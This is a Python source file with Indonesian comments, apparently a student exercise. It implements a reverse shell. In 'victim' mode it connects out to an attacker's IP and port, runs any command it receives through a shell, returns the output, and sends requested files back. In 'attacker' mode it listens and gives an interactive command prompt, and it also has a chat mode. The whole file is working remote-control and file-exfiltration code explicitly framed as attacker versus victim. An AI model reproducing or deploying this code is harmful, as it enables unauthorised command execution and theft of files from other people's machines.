# mengambil argumen
from getopt import getopt
import sys
# untuk chat
from threading import Thread
# untuk menjalankan command
import subprocess
# untuk chdir dkk lebih untuk download
import os
# untuk socket
import socket

IP = ""
PORT = -1
LISTENER = False  # if true -> attacker,else -> victim
CHAT = False

# python keltam.py -i 127.0.0.1 -p 1234
# wb -> write byte


def check_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except:
        return False


def attacker_command(victim_socket):
    skipped = False
    while True:
        try:
            if skipped:
                skipped = False
            else:
                path = victim_socket.recv(2048).decode()
            command = input(path+">")
            if command == "exit":
                victim_socket.close()
                break
            elif command == "":
                print("cannot send empty command")
                skipped = True
                continue
            # kirim command
            victim_socket.send(command.encode())
            if command[:2] == "cd":
                continue
            elif command.startswith("retrieve"):
                # retrieve file
                file_name = command.split(" ")[1]
                file_pointer = open("retrieved_" + file_name, "wb")
                while True:
                    content = victim_socket.recv(2048)
                    if content == b'done':
                        break
                    file_pointer.write(content)
                file_pointer.close()
            else:
                response = victim_socket.recv(2048).decode()
                if response != "nooutput":
                    print(response)
        except Exception as e:
            print(e)
            break


def attacker_send_chat(victim_socket):
    while True:
        try:
            # input message
            message = input("Message to send: ")
            # validasi
            if message == "exit":
                victim_socket.close()
                break
            elif message == "":
                print("cannot send empty message")
                continue
            # send message
            message = message.encode()
            victim_socket.send(message)

        except:
            break


def attacker_recv_chat(victim_socket):
    while True:
        try:
            received = victim_socket.recv(2048)
            if received != b'':
                received = received.decode()
                print("\n" + received)
        except:
            break


def attacker_chat(victim_socket):
    # Create object thread
    send_thread = Thread(target=attacker_send_chat, args=(victim_socket,))
    recv_thread = Thread(target=attacker_recv_chat, args=(victim_socket,))
    # start thread
    send_thread.start()
    recv_thread.start()
    # join thread
    send_thread.join()
    recv_thread.join()


def attacker():
    # create socket &listen &accept connection
    attacker_socket = socket.socket()

    attacker_socket.bind((IP, PORT))
    attacker_socket.listen(1)
    print(f"Listening on {IP} : {PORT}")
    victim_socket, (ip, port) = attacker_socket.accept()
    print(f"Connected with victim at {ip}:{port}")

    if CHAT:
        attacker_chat(victim_socket)
    else:
        attacker_command(victim_socket)

    attacker_socket.close()
    print("program is closed")


def victim_send_chat(victim_socket):
    while True:
        try:
            # input message
            message = input("Message to send: ")
            # validasi
            if message == "exit":
                victim_socket.close()
                break
            elif message == "":
                print("cannot send empty message")
                continue
            # send message
            message = message.encode()
            victim_socket.send(message)

        except:
            break


def victim_recv_chat(victim_socket):
    while True:
        try:
            received = victim_socket.recv(2048)
            if received != b'':
                received = received.decode()
                print("\n" + received)
        except:
            break


def victim_chat(victim_socket):
    # membuat object thread
    send_thread = Thread(target=victim_send_chat, args=(victim_socket,))
    recv_thread = Thread(target=victim_recv_chat, args=(victim_socket,))
    # start
    send_thread.start()
    recv_thread.start()
    # join
    send_thread.join()
    recv_thread.join()


def victim_response(victim_socket):
    while True:
        try:
            path = os.getcwd()
            victim_socket.send(path.encode())
            # acc command
            command = victim_socket.recv(2048).decode()
            # cd folder 1
            if command[:2] == "cd":
                # move directory
                try:
                    os.chdir(command[3:])
                except:
                    victim_socket.send("invalid directory!".encode())
            elif command.startwith("retrieve"):
                file_name = command.split(" ")[1]
                file_pointer = open(file_name, "rb")
                while True:
                    content = file_pointer.read(2048)
                    if content == b'':
                        break
                    victim_socket.send(content)
                victim_socket.send("done".encode())
                file_pointer.close()
            else:
                process = subprocess.Popen(
                    args=command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                output, err = process.communicate()
                if err != b'':
                    # ada error
                    victim_socket.send(err)
                elif output != b'':
                    victim_socket.send(output)
                elif output == b'':
                    victim_socket.send("nooutput".encode())
        except:
            break


def victim():
    victim_socket = socket.socket()

    victim_socket.connect((IP, PORT))

    if CHAT:
        victim_chat(victim_socket)
    else:
        victim_response(victim_socket)

    victim_socket.close()


def process():
    if LISTENER:
        attacker()
    else:
        victim()


def main():
    global IP, PORT, LISTENER, CHAT  # penting untuk assign value

    # ambil argumen saat call program
    # l sama c tidak menggunakan value karena kita ingin tahu dia true atau false
    opts, _ = getopt(sys.argv[1:], "i:p:lc", [
                     "ip=", "port=", "listener", "chat"])

    # assign value
    for key, value in opts:
        # if key == "--i" or key == "--ip": bisa menggunakan ini
        if key in ["-i", "--ip"]:
            IP = value
        elif key in ["-p", "--port"]:
            PORT = int(value)
        elif key in ["-l", "--listener"]:
            LISTENER = True
        elif key in ["-c", "--chat"]:
            CHAT = True
    # validasi value yang dimasukkan
    if check_ip(IP) and PORT >= 0 and PORT <= 65535:
        process()
    else:
        print("invalid")

    pass


if __name__ == "__main__":
    main()
